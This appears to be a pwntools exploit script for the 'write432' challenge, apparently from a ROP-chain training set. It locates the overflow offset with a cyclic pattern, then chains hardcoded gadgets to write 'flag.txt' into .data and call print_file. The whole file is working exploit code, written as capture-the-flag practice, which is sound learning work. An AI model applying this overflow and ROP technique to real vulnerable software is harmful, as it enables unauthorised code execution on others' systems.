from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p = process(exe)
    p.sendlineafter(b'>', payload)
    p.wait()
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './write432'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()


"""
padding

pop_edi_ebp
.data
flag
move_gadget

pop_edi_ebp
.data
.txt
move_gadget

print_file
0x0 (return)
.data

"""

move_gadget  = 0x08048543
data_address = 0x0804a018
pop_edi_ebp  = 0x080485aa

padding = find_ip(cyclic(500))

payload = flat(
    b'A' * padding,

    pop_edi_ebp,
    data_address,
    b"flag",
    move_gadget,

    pop_edi_ebp,
    data_address + 4,
    b".txt",
    move_gadget,

    elf.symbols['print_file'],
    p32(0x0),
    data_address

    # elf.symbols['callme_one'],
)

write('payload', payload)

io.sendlineafter(b'>', payload)
io.interactive()
